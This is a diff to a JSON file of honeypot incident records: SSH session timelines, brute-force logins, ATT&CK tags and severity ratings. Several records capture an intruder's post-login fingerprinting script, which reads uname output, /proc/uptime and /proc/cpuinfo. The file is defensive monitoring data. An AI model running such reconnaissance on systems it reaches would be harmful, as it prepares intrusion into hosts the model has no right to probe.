@@ -1,6 +1,6 @@
 {
-  "generated_at": "2026-03-11T16:49:20Z",
-  "total_cases": 593,
+  "generated_at": "2026-03-11T18:51:31Z",
+  "total_cases": 662,
   "cases": [
     {
       "case_id": "IR-976c59490717",
@@ -19901,6 +19901,2838 @@
         },
         {
           "timestamp": "2026-03-11T16:49:16.803457Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-cb53deff4d22",
+      "src_ip": "142.93.217.143",
+      "first_seen": "2026-03-11T17:03:31.560181Z",
+      "last_seen": "2026-03-11T17:03:31.575140Z",
+      "duration_seconds": 0,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:03:31.560181Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:03:31.575140Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-966bf26f1b65",
+      "src_ip": "142.93.217.143",
+      "first_seen": "2026-03-11T17:04:44.794879Z",
+      "last_seen": "2026-03-11T17:04:47.319859Z",
+      "duration_seconds": 2,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:04:44.794879Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:04:44.971953Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T17:04:44.972579Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T17:04:46.096580Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T17:04:47.319859Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-b209e00d9695",
+      "src_ip": "142.93.217.143",
+      "first_seen": "2026-03-11T17:05:30.193278Z",
+      "last_seen": "2026-03-11T17:05:32.509742Z",
+      "duration_seconds": 2,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:05:30.193278Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:05:30.434983Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T17:05:30.435674Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T17:05:31.179595Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T17:05:32.509742Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-020ccdcb6161",
+      "src_ip": "142.93.217.143",
+      "first_seen": "2026-03-11T17:06:16.437958Z",
+      "last_seen": "2026-03-11T17:06:18.871533Z",
+      "duration_seconds": 2,
+      "login_attempts": 1,
+      "login_success": true,
+      "commands": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E \"model name|Hardware\" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,\"\",$2); print $2; exit}' ; ",
+        "uname -s -v -n -m 2 > /dev/null",
+        "uname -m 2 > /dev/null",
+        "cat /proc/uptime 2 > /dev/null | cut -d. -f1"
+      ],
+      "downloads": [],
+      "ttps": [
+        "T1078",
+        "T1083",
+        "T1592"
+      ],
+      "severity": "HIGH",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:06:16.437958Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:06:16.743231Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T17:06:16.747476Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T17:06:17.697792Z",
+          "event": "cowrie.login.success"
+        },
+        {
+          "timestamp": "2026-03-11T17:06:18.364260Z",
+          "event": "cowrie.session.params"
+        },
+        {
+          "timestamp": "2026-03-11T17:06:18.364799Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:06:18.366005Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:06:18.366728Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:06:18.367398Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:06:18.569352Z",
+          "event": "cowrie.log.closed"
+        },
+        {
+          "timestamp": "2026-03-11T17:06:18.871533Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-4ba712cbb8f0",
+      "src_ip": "142.93.217.143",
+      "first_seen": "2026-03-11T17:07:01.493074Z",
+      "last_seen": "2026-03-11T17:07:03.874287Z",
+      "duration_seconds": 2,
+      "login_attempts": 1,
+      "login_success": true,
+      "commands": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E \"model name|Hardware\" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,\"\",$2); print $2; exit}' ; ",
+        "uname -s -v -n -m 2 > /dev/null",
+        "uname -m 2 > /dev/null",
+        "cat /proc/uptime 2 > /dev/null | cut -d. -f1"
+      ],
+      "downloads": [],
+      "ttps": [
+        "T1078",
+        "T1083",
+        "T1592"
+      ],
+      "severity": "HIGH",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:07:01.493074Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:07:01.696501Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T17:07:01.697260Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T17:07:02.667349Z",
+          "event": "cowrie.login.success"
+        },
+        {
+          "timestamp": "2026-03-11T17:07:03.251949Z",
+          "event": "cowrie.session.params"
+        },
+        {
+          "timestamp": "2026-03-11T17:07:03.252462Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:07:03.253127Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:07:03.253900Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:07:03.254601Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:07:03.611670Z",
+          "event": "cowrie.log.closed"
+        },
+        {
+          "timestamp": "2026-03-11T17:07:03.874287Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-c9502cd023cd",
+      "src_ip": "167.99.180.50",
+      "first_seen": "2026-03-11T17:07:18.010356Z",
+      "last_seen": "2026-03-11T17:07:18.223294Z",
+      "duration_seconds": 0,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:07:18.010356Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:07:18.223294Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-fcb9a7bbd363",
+      "src_ip": "142.93.217.143",
+      "first_seen": "2026-03-11T17:07:46.341445Z",
+      "last_seen": "2026-03-11T17:07:48.675155Z",
+      "duration_seconds": 2,
+      "login_attempts": 1,
+      "login_success": true,
+      "commands": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E \"model name|Hardware\" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,\"\",$2); print $2; exit}' ; ",
+        "uname -s -v -n -m 2 > /dev/null",
+        "uname -m 2 > /dev/null",
+        "cat /proc/uptime 2 > /dev/null | cut -d. -f1"
+      ],
+      "downloads": [],
+      "ttps": [
+        "T1078",
+        "T1083",
+        "T1592"
+      ],
+      "severity": "HIGH",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:07:46.341445Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:07:46.628860Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T17:07:46.629575Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T17:07:47.663427Z",
+          "event": "cowrie.login.success"
+        },
+        {
+          "timestamp": "2026-03-11T17:07:48.241935Z",
+          "event": "cowrie.session.params"
+        },
+        {
+          "timestamp": "2026-03-11T17:07:48.242436Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:07:48.243078Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:07:48.243781Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:07:48.244449Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:07:48.452305Z",
+          "event": "cowrie.log.closed"
+        },
+        {
+          "timestamp": "2026-03-11T17:07:48.675155Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-32b26563fa16",
+      "src_ip": "147.185.133.134",
+      "first_seen": "2026-03-11T17:08:26.931506Z",
+      "last_seen": "2026-03-11T17:08:36.769578Z",
+      "duration_seconds": 9,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:08:26.931506Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:08:36.769578Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-4f470df55a58",
+      "src_ip": "142.93.217.143",
+      "first_seen": "2026-03-11T17:08:30.568930Z",
+      "last_seen": "2026-03-11T17:08:33.502985Z",
+      "duration_seconds": 2,
+      "login_attempts": 1,
+      "login_success": true,
+      "commands": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E \"model name|Hardware\" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,\"\",$2); print $2; exit}' ; ",
+        "uname -s -v -n -m 2 > /dev/null",
+        "uname -m 2 > /dev/null",
+        "cat /proc/uptime 2 > /dev/null | cut -d. -f1"
+      ],
+      "downloads": [],
+      "ttps": [
+        "T1078",
+        "T1083",
+        "T1592"
+      ],
+      "severity": "HIGH",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:08:30.568930Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:08:30.886622Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T17:08:30.887290Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T17:08:31.915393Z",
+          "event": "cowrie.login.success"
+        },
+        {
+          "timestamp": "2026-03-11T17:08:32.554458Z",
+          "event": "cowrie.session.params"
+        },
+        {
+          "timestamp": "2026-03-11T17:08:32.554984Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:08:32.555567Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:08:32.556350Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:08:32.557094Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:08:32.750075Z",
+          "event": "cowrie.log.closed"
+        },
+        {
+          "timestamp": "2026-03-11T17:08:33.502985Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-0c2d3ca8f477",
+      "src_ip": "167.99.180.50",
+      "first_seen": "2026-03-11T17:08:52.007410Z",
+      "last_seen": "2026-03-11T17:08:57.028639Z",
+      "duration_seconds": 5,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:08:52.007410Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:08:52.603671Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T17:08:52.604365Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T17:08:55.295068Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T17:08:57.028639Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-a52b60a5d705",
+      "src_ip": "142.93.217.143",
+      "first_seen": "2026-03-11T17:09:14.675117Z",
+      "last_seen": "2026-03-11T17:09:16.785031Z",
+      "duration_seconds": 2,
+      "login_attempts": 1,
+      "login_success": true,
+      "commands": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E \"model name|Hardware\" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,\"\",$2); print $2; exit}' ; ",
+        "uname -s -v -n -m 2 > /dev/null",
+        "uname -m 2 > /dev/null",
+        "cat /proc/uptime 2 > /dev/null | cut -d. -f1"
+      ],
+      "downloads": [],
+      "ttps": [
+        "T1078",
+        "T1083",
+        "T1592"
+      ],
+      "severity": "HIGH",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:09:14.675117Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:09:14.810839Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T17:09:14.811464Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T17:09:15.772889Z",
+          "event": "cowrie.login.success"
+        },
+        {
+          "timestamp": "2026-03-11T17:09:16.286892Z",
+          "event": "cowrie.session.params"
+        },
+        {
+          "timestamp": "2026-03-11T17:09:16.287365Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:09:16.287979Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:09:16.288721Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:09:16.289460Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:09:16.490139Z",
+          "event": "cowrie.log.closed"
+        },
+        {
+          "timestamp": "2026-03-11T17:09:16.785031Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-1eca653253e4",
+      "src_ip": "167.99.180.50",
+      "first_seen": "2026-03-11T17:10:14.866246Z",
+      "last_seen": "2026-03-11T17:10:22.046146Z",
+      "duration_seconds": 7,
+      "login_attempts": 1,
+      "login_success": true,
+      "commands": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E \"model name|Hardware\" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,\"\",$2); print $2; exit}' ; ",
+        "uname -s -v -n -m 2 > /dev/null",
+        "uname -m 2 > /dev/null",
+        "cat /proc/uptime 2 > /dev/null | cut -d. -f1"
+      ],
+      "downloads": [],
+      "ttps": [
+        "T1078",
+        "T1083",
+        "T1592"
+      ],
+      "severity": "HIGH",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:10:14.866246Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:10:15.267723Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T17:10:15.268393Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T17:10:19.038359Z",
+          "event": "cowrie.login.success"
+        },
+        {
+          "timestamp": "2026-03-11T17:10:20.550929Z",
+          "event": "cowrie.session.params"
+        },
+        {
+          "timestamp": "2026-03-11T17:10:20.551442Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:10:20.552133Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:10:20.552937Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:10:20.553652Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:10:21.462669Z",
+          "event": "cowrie.log.closed"
+        },
+        {
+          "timestamp": "2026-03-11T17:10:22.046146Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-efe8d4fe8963",
+      "src_ip": "167.99.180.50",
+      "first_seen": "2026-03-11T17:11:32.033365Z",
+      "last_seen": "2026-03-11T17:11:38.753628Z",
+      "duration_seconds": 6,
+      "login_attempts": 1,
+      "login_success": true,
+      "commands": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E \"model name|Hardware\" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,\"\",$2); print $2; exit}' ; ",
+        "uname -s -v -n -m 2 > /dev/null",
+        "uname -m 2 > /dev/null",
+        "cat /proc/uptime 2 > /dev/null | cut -d. -f1"
+      ],
+      "downloads": [],
+      "ttps": [
+        "T1078",
+        "T1083",
+        "T1592"
+      ],
+      "severity": "HIGH",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:11:32.033365Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:11:32.655037Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T17:11:32.655730Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T17:11:35.714903Z",
+          "event": "cowrie.login.success"
+        },
+        {
+          "timestamp": "2026-03-11T17:11:37.160345Z",
+          "event": "cowrie.session.params"
+        },
+        {
+          "timestamp": "2026-03-11T17:11:37.161722Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:11:37.162354Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:11:37.163112Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:11:37.163867Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:11:37.847525Z",
+          "event": "cowrie.log.closed"
+        },
+        {
+          "timestamp": "2026-03-11T17:11:38.753628Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-5a95406ece85",
+      "src_ip": "167.99.180.50",
+      "first_seen": "2026-03-11T17:12:57.733429Z",
+      "last_seen": "2026-03-11T17:12:57.918642Z",
+      "duration_seconds": 0,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:12:57.733429Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:12:57.918642Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-f635b65b839c",
+      "src_ip": "167.99.180.50",
+      "first_seen": "2026-03-11T17:12:58.125218Z",
+      "last_seen": "2026-03-11T17:13:01.129781Z",
+      "duration_seconds": 3,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:12:58.125218Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:12:58.126469Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T17:12:58.375142Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T17:12:59.650777Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T17:13:01.129781Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-574d4e72a3f1",
+      "src_ip": "167.99.180.50",
+      "first_seen": "2026-03-11T17:14:08.281736Z",
+      "last_seen": "2026-03-11T17:14:08.295687Z",
+      "duration_seconds": 0,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:14:08.281736Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:14:08.295687Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-bf7063960552",
+      "src_ip": "20.105.65.67",
+      "first_seen": "2026-03-11T17:22:16.881840Z",
+      "last_seen": "2026-03-11T17:22:16.882689Z",
+      "duration_seconds": 0,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:22:16.881840Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:22:16.882689Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-3b258eae7363",
+      "src_ip": "62.212.229.142",
+      "first_seen": "2026-03-11T17:33:20.495694Z",
+      "last_seen": "2026-03-11T17:33:51.084939Z",
+      "duration_seconds": 30,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:33:20.495694Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:33:51.084939Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-f6db6b8d0eb3",
+      "src_ip": "167.71.230.119",
+      "first_seen": "2026-03-11T17:35:28.722263Z",
+      "last_seen": "2026-03-11T17:35:28.737894Z",
+      "duration_seconds": 0,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:35:28.722263Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:35:28.737894Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-2ad042239c16",
+      "src_ip": "167.71.230.119",
+      "first_seen": "2026-03-11T17:36:52.911167Z",
+      "last_seen": "2026-03-11T17:36:56.109604Z",
+      "duration_seconds": 3,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:36:52.911167Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:36:53.130136Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T17:36:53.130814Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T17:36:54.647581Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T17:36:56.109604Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-a5393354a26d",
+      "src_ip": "167.71.230.119",
+      "first_seen": "2026-03-11T17:37:42.806866Z",
+      "last_seen": "2026-03-11T17:37:45.027687Z",
+      "duration_seconds": 2,
+      "login_attempts": 1,
+      "login_success": true,
+      "commands": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E \"model name|Hardware\" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,\"\",$2); print $2; exit}' ; ",
+        "uname -s -v -n -m 2 > /dev/null",
+        "uname -m 2 > /dev/null",
+        "cat /proc/uptime 2 > /dev/null | cut -d. -f1"
+      ],
+      "downloads": [],
+      "ttps": [
+        "T1078",
+        "T1083",
+        "T1592"
+      ],
+      "severity": "HIGH",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:37:42.806866Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:37:43.106164Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T17:37:43.106849Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T17:37:43.997790Z",
+          "event": "cowrie.login.success"
+        },
+        {
+          "timestamp": "2026-03-11T17:37:44.540982Z",
+          "event": "cowrie.session.params"
+        },
+        {
+          "timestamp": "2026-03-11T17:37:44.541490Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:37:44.542135Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:37:44.542850Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:37:44.543515Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:37:44.846205Z",
+          "event": "cowrie.log.closed"
+        },
+        {
+          "timestamp": "2026-03-11T17:37:45.027687Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-fca8d81c4793",
+      "src_ip": "167.71.230.119",
+      "first_seen": "2026-03-11T17:38:33.558141Z",
+      "last_seen": "2026-03-11T17:38:35.931778Z",
+      "duration_seconds": 2,
+      "login_attempts": 1,
+      "login_success": true,
+      "commands": [
